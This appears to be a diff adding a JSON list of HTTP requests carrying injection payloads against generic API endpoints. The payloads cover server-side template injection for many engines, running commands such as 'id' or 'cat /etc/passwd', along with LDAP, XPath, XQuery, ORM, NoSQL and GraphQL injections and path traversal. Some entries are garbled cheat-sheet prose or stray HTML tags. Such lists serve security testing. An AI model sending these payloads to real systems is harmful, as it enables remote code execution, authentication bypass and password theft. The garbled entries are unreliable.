+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "$authors = array("
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "#{__import__('os').system('id')}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "#{__import__('os').system('id')}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "global.process.mainModule.require(\"child_process\").execSync(\"id && sleep 5\").toString()"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "global.process.mainModule.require(\"child_process\").execSync(\"id && sleep 5\").toString()"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "py\n{{7*7}}\n{{7*'7'}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "py\n{{7*7}}\n{{7*'7'}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "include(join(\"\", [\"Y:/A:/\", shell_exec('id')]))"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "include(join(\"\", [\"Y:/A:/\", shell_exec('id')]))"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "{{= }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "{{= }}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "\"\"[\"x\"][global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()]"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "\"\"[\"x\"][global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()]"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "> Apache Velocity is a Java-based template engine that allows web designers to embed Java code references directly within templates."
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "> Apache Velocity is a Java-based template engine that allows web designers to embed Java code references directly within templates."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "<tfoot>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "<tfoot>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "content": "<table>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/page",
+    "json": {
+      "content": "<table>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/preview",
+    "params": {
+      "text": "<%= system('cat /etc/passwd') %>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/preview",
+    "json": {
+      "text": "<%= system('cat /etc/passwd') %>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/eval",
+    "params": {
+      "expr": "{{this.push (lookup string.sub \"constructor\")}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/eval",
+    "json": {
+      "expr": "{{this.push (lookup string.sub \"constructor\")}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/display",
+    "params": {
+      "value": "{{#with \"s\" as |string|}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/display",
+    "json": {
+      "value": "{{#with \"s\" as |string|}}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "params": {
+      "input": "<!-- END authorline -->"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "input": "<!-- END authorline -->"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "template": "</html>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "</html>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "name": "Any of these payloads allows direct access to the `os` module"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/search",
+    "json": {
+      "name": "Any of these payloads allows direct access to the `os` module"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/format",
+    "params": {
+      "query": "{var $X=\"POC\"}{$X}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "query": "{var $X=\"POC\"}{$X}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/auth",
+    "json": {
+      "username": "*",
+      "password": "*"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/login",
+    "json": {
+      "user": "admin)(&)",
+      "pass": "any"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/search",
+    "params": {
+      "filter": "admin)(|(password=*)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/find",
+    "params": {
+      "uid": "*)(uid=*))(|(uid=*"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/bind",
+    "json": {
+      "dn": "cn=admin\u0000,dc=evil"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/query",
+    "params": {
+      "search": "*))(|(objectclass=*)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/users",
+    "params": {
+      "filter": "*)(objectClass=user)(|(sAMAccountName=*"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/groups",
+    "params": {
+      "name": "*)(objectClass=group)(|(cn=*"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/attrs",
+    "params": {
+      "attr": "*)(|(userPassword=*)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/check",
+    "params": {
+      "id": "admin)(|(password=a*)"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/verify",
+    "params": {
+      "id": "admin)(|(password=zzzzz*)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/test",
+    "json": {
+      "user": "admin)(|(password=a*)",
+      "test": true
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/escape",
+    "params": {
+      "name": "admin))(|(uid=*"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/match",
+    "params": {
+      "pattern": "*admin*)(|(cn=*"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/ldap/filter",
+    "params": {
+      "cn": "test\\)(|(objectClass=*"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/xml/login",
+    "json": {
+      "user": "' or '1'='1",
+      "pass": "' or '1'='1"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/xml/auth",
+    "json": {
+      "username": "admin' or '1'='1' or '1'='1",
+      "password": "x"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/xml/signin",
+    "json": {
+      "user": "admin'--",
+      "pass": "anything"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/verify",
+    "params": {
+      "id": "1 or 1=1"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/query",
+    "params": {
+      "xpath": "//user[name/text()='' or 1=1 or ''='']"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/search",
+    "params": {
+      "path": "//user/password/text()"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/find",
+    "params": {
+      "expr": "1] | //password | user[id=1"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/node",
+    "params": {
+      "select": "../password"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/get",
+    "params": {
+      "path": "self::node()/password"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/fetch",
+    "params": {
+      "xpath": "ancestor::*/password"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/check",
+    "params": {
+      "test": "' or string-length(//password)>0 or ''='"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/validate",
+    "params": {
+      "data": "' or substring(//password,1,1)='a' or ''='"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/exists",
+    "params": {
+      "query": "' or contains(//password,'admin') or ''='"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/xml/match",
+    "params": {
+      "filter": "' or starts-with(//password,'pass') or ''='"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/xquery",
+    "json": {
+      "query": "doc('file:///etc/passwd')"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/xquery/exec",
+    "json": {
+      "expr": "collection()//password"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/xquery/run",
+    "json": {
+      "xq": "for $x in //user return $x/password"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/xquery/eval",
+    "json": {
+      "query": "let $x := //password return $x"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/template",
+    "json": {
+      "name": "{{7*7}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/render",
+    "json": {
+      "template": "{{config}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/format",
+    "json": {
+      "text": "{{''.__class__.__mro__[2].__subclasses__()}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/twig",
+    "json": {
+      "input": "{{_self.env.registerUndefinedFilterCallback('exec')}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ftl",
+    "json": {
+      "data": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/velocity",
+    "json": {
+      "vm": "#set($str=$class.inspect('java.lang.String').type)"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/pebble",
+    "json": {
+      "tmpl": "{% set cmd = 'id' %}{{ cmd | raw }}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/smarty",
+    "json": {
+      "tpl": "{php}system('id');{/php}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/thymeleaf",
+    "json": {
+      "expr": "__${T(java.lang.Runtime).getRuntime().exec('id')}__"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/spring/el",
+    "json": {
+      "expr": "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/jsp",
+    "params": {
+      "name": "${pageContext.request.getSession().setAttribute('admin',true)}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/struts",
+    "json": {
+      "action": "%{(#rt=@java.lang.Runtime@getRuntime().exec('id'))}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/mvel",
+    "json": {
+      "expr": "Runtime.getRuntime().exec('id')"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/spel",
+    "json": {
+      "expression": "#{T(java.lang.Runtime).getRuntime().exec('whoami')}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/graphql",
+    "json": {
+      "query": "{__schema{types{name}}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/graphql",
+    "json": {
+      "data": [
+        {
+          "query": "{user(id:1){password}}"
+        },
+        {
+          "query": "{user(id:2){password}}"
+        }
+      ]
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/graphql",
+    "json": {
+      "query": "{a1:user(id:1){id} a2:user(id:1){id} a3:user(id:1){id}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/graphql",
+    "json": {
+      "query": "{user{friends{friends{friends{friends{name}}}}}}"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/graphql",
+    "json": {
+      "query": "mutation{deleteUser(id:1)}"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/hibernate",
+    "params": {
+      "hql": "from User where name='admin' or '1'='1'"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/jpa",
+    "params": {
+      "query": "SELECT u FROM User u WHERE u.name = 'admin' OR '1'='1'"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/django",
+    "params": {
+      "filter": "__class__.__mro__[2].__subclasses__()"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/sqlalchemy",
+    "json": {
+      "filter": "User.name == 'admin' or True"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/mongoose",
+    "json": {
+      "$where": "this.password.length > 0"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/directory/search",
+    "params": {
+      "q": "John*)(|(department=*))",
+      "type": "employee"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/settings",
+    "json": {
+      "config_path": "../../../password",
+      "format": "xml"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/report/generate",
+    "json": {
+      "template": "{{request.application.__globals__}}",
+      "format": "pdf"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "filter": "*)(uid=*))(|(uid=*"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/query",
+    "json": {
+      "filter": "*)(uid=*))(|(uid=*"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "filter": "*))%00"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/query",
+    "json": {
+      "filter": "*))%00"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "filter": "*()|&"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/query",
+    "json": {
+      "filter": "*()|&"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "filter": "*()|&("
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/query",
+    "json": {
+      "filter": "*()|&("
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "filter": "admin)(&"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/query",
+    "json": {
+      "filter": "admin)(&"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "filter": "admin)(|"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/query",
+    "json": {
+      "filter": "admin)(|"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "filter": "admin)(!"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/query",
+    "json": {
+      "filter": "admin)(!"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/search",
+    "params": {
+      "filter": "admin)(&(objectClass=*))"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/ldap/query",
+    "json": {
+      "filter": "admin)(&(objectClass=*))"
+    }
+  }
+]
